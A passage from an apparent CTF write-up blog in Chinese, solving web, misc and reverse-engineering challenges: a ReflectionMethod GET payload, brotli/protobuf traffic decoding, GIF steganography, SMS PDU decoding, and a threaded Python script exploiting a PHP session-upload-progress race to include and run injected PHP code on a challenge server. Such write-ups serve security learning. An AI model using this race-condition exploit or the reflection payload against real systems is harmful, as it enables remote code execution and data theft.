class="hljs-keyword">function</span> <span class="hljs-title">o</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">q</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">r</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">t</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    </span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$rc</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rc&quot;</span>];</span><br><span class="language-php"><span class="hljs-variable">$rb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rb&quot;</span>];</span><br><span class="language-php"><span class="hljs-variable">$ra</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ra&quot;</span>];</span><br><span class="language-php"><span class="hljs-variable">$rd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rd&quot;</span>];</span><br><span class="language-php"><span class="hljs-variable">$method</span>= <span class="hljs-keyword">new</span> <span class="hljs-variable">$rc</span>(<span class="hljs-variable">$ra</span>, <span class="hljs-variable">$rb</span>);</span><br><span class="language-php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$method</span>-&gt;<span class="hljs-variable">$rd</span>());</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>构造ReflectionMethod类遍历a-t方法的注释，payload：<code>?ra=User&amp;rb=a&amp;rc=ReflectionMethod&amp;rd=getDocComment</code>。<br>其中一个方法注释中包含flag。</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny_traffic"></a>tiny_traffic</h4><p>分析流量，导出全部http对象。<br>在python中使用brotli解码test和secret。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> brotli<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract</span>(<span class="hljs-params">file_name</span>):<br>    out = <span class="hljs-built_in">open</span>(file_name + <span class="hljs-string">&quot;_extracted&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>    out.write(brotli.decompress(<span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&quot;rb&quot;</span>).read()))<br>    out.close()<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    extract(<span class="hljs-string">&quot;secret&quot;</span>)<br>    extract(<span class="hljs-string">&quot;test&quot;</span>)<br></code></pre></td></tr></table></figure><p>test为一个proto文件，内容为：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">PBResponse</span> &#123;<br>  <span class="hljs-type">int32</span> code = <span class="hljs-number">1</span>;<br>  <span class="hljs-type">int64</span> flag_part_convert_to_hex_plz = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">message </span><span class="hljs-title class_">data</span> &#123;<br>    <span class="hljs-type">string</span> junk_data = <span class="hljs-number">2</span>;<br>    <span class="hljs-type">string</span> flag_part = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">repeated</span> data dataList = <span class="hljs-number">3</span>;<br>  <span class="hljs-type">int32</span> flag_part_plz_convert_to_hex = <span class="hljs-number">4</span>;<br>  <span class="hljs-type">string</span> flag_last_part = <span class="hljs-number">5</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">PBRequest</span> &#123;<br>  <span class="hljs-type">string</span> cate_id = <span class="hljs-number">1</span>;<br>  <span class="hljs-type">int32</span> page = <span class="hljs-number">2</span>;<br>  <span class="hljs-type">int32</span> pageSize = <span class="hljs-number">3</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>猜测secret为PBResponse Message，使用protoc解码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">protoc --decode=PBResponse ./test_extracted &lt; ./secret_extracted</span><br>code: 200<br>flag_part_convert_to_hex_plz: 15100450<br>dataList &#123;<br>  flag_part: &quot;e2345&quot;<br>  junk_data: &quot;7af2c&quot;<br>&#125;<br>dataList &#123;<br>  flag_part: &quot;7889b0&quot;<br>  junk_data: &quot;82bc0&quot;<br>&#125;<br>flag_part_plz_convert_to_hex: 16453958<br>flag_last_part: &quot;d172a38dc&quot;<br></code></pre></td></tr></table></figure><p>忽略junk_data，部分提示转换字段转为hex后拼接得到flag。</p><h4 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h4><p>导出gif全部关键帧，在最后几帧发现异常白点，ps取色为rgb(233,233,233)。<br><img src="https://i.loli.net/2021/05/16/lseWVX7Uu61Gwzi.png"><br>因与背景色rgb(247,247,247)过于相近，怀疑存在隐写。<br>使用python将所有关键帧中的(233,233,233)像素点在同等大小的画布上画成黑色，每画一下保存一张关键帧。    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> time<br><br>out = Image.new(<span class="hljs-string">&quot;L&quot;</span>, (<span class="hljs-number">400</span>,<span class="hljs-number">400</span>), <span class="hljs-number">255</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">383</span>):<br>    img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">1</span>]):<br>            p = img.getpixel((x,y))<br>            <span class="hljs-keyword">if</span> p == (<span class="hljs-number">233</span>,<span class="hljs-number">233</span>,<span class="hljs-number">233</span>):<br>                <span class="hljs-built_in">print</span>(i,x,y)<br>                out.putpixel((y,x), <span class="hljs-number">0</span>)<br>                out.save(<span class="hljs-string">f&quot;out<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>                <br>out.save(<span class="hljs-string">f&quot;out<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>从头逐一切换图片，观察到黑色像素画出flag。</p><h2 id="第二卷"><a href="#第二卷" class="headerlink" title="第二卷"></a>第二卷</h2><h3 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h3><h4 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h4><p>扫描找到.listing文件，内有提示you_can_seeeeeeee_me.php，打开是一个phpinfo。<br>phpinfo中给出了sessions目录，利用条件竞争包含session漏洞，将PHP_SESSION_UPLOAD_PROGRESS内添加php代码并上传文件执行代码。    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> io<br><br>target = <span class="hljs-string">&quot;http://124.71.231.151:25908/&quot;</span><br>session_id = <span class="hljs-string">&quot;bellwind&quot;</span><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;cf&quot;</span>: <span class="hljs-string">&quot;../../../var/lib/php/sessions/eacadbajad/sess_&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(session_id),<br>    <span class="hljs-string">&quot;field&quot;</span>: <span class="hljs-string">&quot;?????&quot;</span>,<br>&#125;<br>event = threading.Event()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session: requests.Session</span>):<br>    file = io.BytesIO(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        event.wait()<br>        response = session.post(<br>            target,<br>            data=&#123;<br>                <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;&lt;?php system(&#x27;ls /etc &gt; 1.txt&#x27;);?&gt;&quot;</span><br>            &#125;,<br>            cookies=&#123;<br>                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: session_id<br>            &#125;,<br>            files=&#123;<br>                <span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&quot;verysafe.jpg&quot;</span>, file)<br>            &#125;<br>        )<br>        <span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session: requests.Session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        event.wait()<br>        response = session.post(<br>            target,<br>            data=payload,<br>            cookies=&#123;<br>                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: session_id<br>            &#125;,<br>        )<br>        <span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sess = requests.session()<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        threading.Thread(target=write, args=(sess,)).start()<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        threading.Thread(target=read, args=(sess,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span> event.isSet():<br>        time.sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;waiting.&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>经测试无法执行命令，但函数是可以用的。这里利用<code>scandir</code>函数列<code>/etc</code>目录文件，最终在<code>/etc/icbjgbfahe/ajgfbfeedc/bfcefdfdda/icdjcdcabj/ddadebjbab</code>下找到<code>fl444444g</code>，<code>file_get_contents</code>函数读取得到flag。</p><h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h4><p>使用golang解码pdu信息data.txt，可知前八位flag为手机号前八位。    </p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/hex&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/xlab/at/sms&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;sort&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;data.txt&quot;</span>)<br>s := <span class="hljs-type">string</span>(data)<br>s1 := strings.Split(s, <span class="hljs-string">&quot;\r\n&quot;</span>)[<span class="hljs-number">4</span>:]<br><span class="hljs-keyword">var</span> result []*sms.Message<br><span class="hljs-keyword">for</span> _, s := <span class="hljs-keyword">range</span> s1 &#123;<br><span class="hljs-keyword">if</span> r := decode(s); r != <span class="hljs-literal">nil</span> &#123;<br>result = <span class="hljs-built_in">append</span>(result, r)<br>&#125;<br>&#125;<br>sorter := messageSorter(result)<br>sort.Sort(sorter)<br>fina := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> _, s := <span class="hljs-keyword">range</span> sorter &#123;<br>fina += s.Text<br>&#125;<br>fmt.Println(fina)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">decode</span><span class="hljs-params">(msg <span class="hljs-type">string</span>)</span></span> *sms.Message &#123;<br>bs, _ := hex.DecodeString(msg)<br>m := <span class="hljs-built_in">new</span>(sms.Message)<br>_, err := m.ReadFrom(bs)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> m<br>&#125;<br><br><span class="hljs-keyword">type</span> messageSorter []*sms.Message<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m messageSorter)</span></span> Len() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(m)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m messageSorter)</span></span> Less(i, j <span class="hljs-type">int</span>) <span class="hljs-type">bool</span> &#123;<br>ms := []*sms.Message(m)<br><span class="hljs-keyword">return</span> time.Time(ms[i].ServiceCenterTime).Before(time.Time(ms[j].ServiceCenterTime))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m messageSorter)</span></span> Swap(i, j <span class="hljs-type">int</span>) &#123;<br>m[i], m[j] = m[j], m[i]<br>&#125;<br></code></pre></td></tr></table></figure><p>根据时间戳排序并连接数据，可发现十六进制是一张png图片。<br>保存为png后爆破宽高，倒转图片方向读后半段flag并连接前段flag。</p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h4><p>下载下来是一个<code>baby.bc</code>文件，需要先用<code>clang</code>将其编译为二进制可执行文件，然后再在<code>IDA</code>中将其反编译然后进行进一步分析。<br>先对main函数进行分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 i; <span class="hljs-comment">// [rsp+10h] [rbp-18h]</span><br>  <span class="hljs-type">size_t</span> v6; <span class="hljs-comment">// [rsp+18h] [rbp-10h]</span><br><br>  __isoc99_scanf(&amp;unk_403004, input, envp);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-built_in">strlen</span>(input) == <span class="hljs-number">25</span> )      <span class="hljs-comment">// 长度为25</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] )                             <span class="hljs-comment">// 有输入</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(input[<span class="hljs-number">0</span>] - <span class="hljs-number">48</span>) &gt; <span class="hljs-number">5u</span> )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      v6 = <span class="hljs-built_in">strlen</span>(input);<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1LL</span>; ; ++i )<br>      &#123;<br>        v4 = i;<br>        <span class="hljs-keyword">if</span> ( i &gt;= v6 )                          <span class="hljs-comment">// 超出字符串长度</span><br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(input[v4] - <span class="hljs-number">48</span>) &gt; <span class="hljs-number">5u</span> )<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (fill_number(input) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> &amp;&amp; (docheck() &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CISCN&#123;MD5(%s)&#125;&quot;</span>, input);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出主要的处理逻辑是在24行if语句中的<code>fill_number</code>和<code>docheck</code>当中，然后就要输出的格式为<code>CISCN&#123;MD5(%s)&#125;</code>，接着分析这两个函数<br>fill_number:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">fill_number</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> v2; <span class="hljs-comment">// [rsp+1h] [rbp-69h]</span><br>  <span class="hljs-type">char</span> v3; <span class="hljs-comment">// [rsp+11h] [rbp-59h]</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+21h] [rbp-49h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [rsp+31h] [rbp-39h]</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [rsp+40h] [rbp-2Ah]</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [rsp+41h] [rbp-29h]</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+4Ah] [rbp-20h]</span><br>  __int64 v9; <span class="hljs-comment">// [rsp+52h] [rbp-18h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp+5Ah] [rbp-10h]</span><br><br>  v10 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v9 = v10;<br>    v8 = <span class="hljs-number">5</span> * v10;<br>    v7 = *(_BYTE *)(a1 + <span class="hljs-number">5</span> * v10);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v7 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10] = v7 - <span class="hljs-number">48</span>;<br>    &#125;<br>    v5 = *(_BYTE *)(a1 + v8 + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">1</span>] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">1</span>] = v5 - <span class="hljs-number">48</span>;<br>    &#125;<br>    v4 = *(_BYTE *)(a1 + v8 + <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">2</span>] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">2</span>] = v4 - <span class="hljs-number">48</span>;<br>    &#125;<br>    v3 = *(_BYTE *)(a1 + v8 + <span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">3</span>] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">3</span>] = v3 - <span class="hljs-number">48</span>;<br>    &#125;<br>    v2 = *(_BYTE *)(a1 + v8 + <span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">4</span>] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v2 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">4</span>] = v2 - <span class="hljs-number">48</span>;<br>    &#125;<br>    ++v10;<br>    v6 = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v9 + <span class="hljs-number">1</span> &lt; <span 